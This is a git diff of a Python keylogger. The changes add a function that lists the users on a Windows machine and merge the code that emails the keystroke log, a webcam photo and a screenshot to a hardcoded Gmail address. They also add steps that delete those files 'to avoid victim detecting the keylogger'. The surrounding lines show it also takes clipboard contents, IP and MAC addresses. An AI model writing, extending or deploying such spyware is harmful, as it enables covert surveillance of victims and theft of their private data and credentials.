@@ -12,6 +12,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import os
 
 
 # class to log the keys and create a log file with intercepted keystrokes in
@@ -41,7 +42,7 @@ class KeyLogger:
             nonlocal time_limit_reached
             time_limit_reached = True
 
-        timer = threading.Timer(20, stop_logger)
+        timer = threading.Timer(5, stop_logger)
 
         timer.start()
 
@@ -99,8 +100,22 @@ def system_info():
     # Get MAC Address and format it correctly
     mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
     # Put all data in list
-    system_data = [info[1], info[5], platform.platform(), ip_address, mac_address]
-    return system_data
+    sys_data = [info[1], info[5], platform.platform(), ip_address, mac_address]
+    return sys_data
+
+
+def get_users():
+    # This is creating a list of the users in the directory "\Users" and setting it to filenames
+    filenames = os.listdir(path=r"\Users")
+    # Removing the default files by looping through them and removing them
+    default_files = ["All Users", "Default", "desktop.ini", "Default User"]
+    for file in default_files:
+        filenames.remove(file)
+    # Assigning all the remaining usernames to a string so that it can be returned from the function
+    result = ""
+    for file in filenames:
+        result = result + file + " , "
+    return "The Users on this system are: " + result
 
 
 # Class to create and send email
@@ -121,35 +136,21 @@ class EmailSender:
         # Attach the message to the email
         email.attach(MIMEText(message, 'plain'))
 
-        # Open the file in binary mode
-        with open(attachment_path1, 'rb') as attachment:
-            # Create a MIMEBase object and set the appropriate MIME type for the attachment
-            part1 = MIMEBase('application', 'octet-stream')
-            part1.set_payload(attachment.read())
+        attachments = [attachment_path1, attachment_path2, attachment_path3]
+        for item in attachments:
+            # Open the file in binary mode
+            with open(item, 'rb') as attachment:
+                # Create a MIMEBase object and set the appropriate MIME type for the attachment
+                part = MIMEBase('application', 'octet-stream')
+                part.set_payload(attachment.read())
 
-        with open(attachment_path2, 'rb') as attachment:
-            # Create a MIMEBase object and set the appropriate MIME type for the attachment
-            part2 = MIMEBase('application', 'octet-stream')
-            part2.set_payload(attachment.read())
+            # Encode the attachment in ASCII characters to send by email
+            encoders.encode_base64(part)
+            # Add a header to specify the filename of the attachment
+            part.add_header('Content-Disposition', f"attachment; filename= {item}")
 
-        with open(attachment_path3, 'rb') as attachment:
-            # Create a MIMEBase object and set the appropriate MIME type for the attachment
-            part3 = MIMEBase('application', 'octet-stream')
-            part3.set_payload(attachment.read())
-
-        # Encode the attachment in ASCII characters to send by email
-        encoders.encode_base64(part1)
-        encoders.encode_base64(part2)
-        encoders.encode_base64(part3)
-        # Add a header to specify the filename of the attachment
-        part1.add_header('Content-Disposition', f"attachment; filename= {attachment_path1}")
-        part2.add_header('Content-Disposition', f"attachment; filename= {attachment_path2}")
-        part3.add_header('Content-Disposition', f"attachment; filename= {attachment_path3}")
-
-        # Add the attachment to the email
-        email.attach(part1)
-        email.attach(part2)
-        email.attach(part3)
+            # Add the attachment to the email
+            email.attach(part)
 
         # Connect to the gmail SMTP server and send the email
         with smtplib.SMTP('smtp.gmail.com', 587) as server:
@@ -160,12 +161,21 @@ class EmailSender:
 
 # run keylogger
 if __name__ == "__main__":
+    # if keystrokes.txt doesn't exist create file
+    if not(os.path.exists("keystrokes.txt")):
+        f = open("keystrokes.txt", "w")
+    # if keylogger.txt does exist just open the file
+    else:
+        f = open("keystrokes.txt")
+
+    # run other functions to gather data
     webcam_image()
     take_screenshot()
     logger = KeyLogger()
     logger.main()
-    time.sleep(20)
+    time.sleep(5)
 
+# gather information for email
 system_data = system_info()
 
 sender_email = "redpanda121003@gmail.com"
@@ -175,6 +185,7 @@ email_sender = EmailSender(sender_email, sender_password)
 
 recipient_email = "redpanda121003@gmail.com"
 email_subject = "Keylogger Data"
+# display the data in a presentable way
 email_message = '''\
 
 The following data was retrieved:
@@ -185,13 +196,26 @@ Operating System: {system_data[2]}
 IP Address: {system_data[3]}
 MAC Address: {system_data[4]}
 
+{get_users}
+
 {clipboard}
 
 \
-'''.format(system_data=system_data, clipboard=clipboard())
+'''.format(system_data=system_data, clipboard=clipboard(), get_users=get_users())
 
+# assign variables to attachments for the email
 keystrokes_file = "keystrokes.txt"
 webcam_file = "webcam.png"
 screenshot_file = "screenshot.png"
 
+# send the email
 email_sender.send_email(recipient_email, email_subject, email_message, keystrokes_file, webcam_file, screenshot_file)
+
+# close keystrokes file
+f.close()
+
+# delete files to avoid victim detecting the keylogger
+os.remove("keystrokes.txt")
+os.remove("screenshot.png")
+os.remove("webcam.png")
+
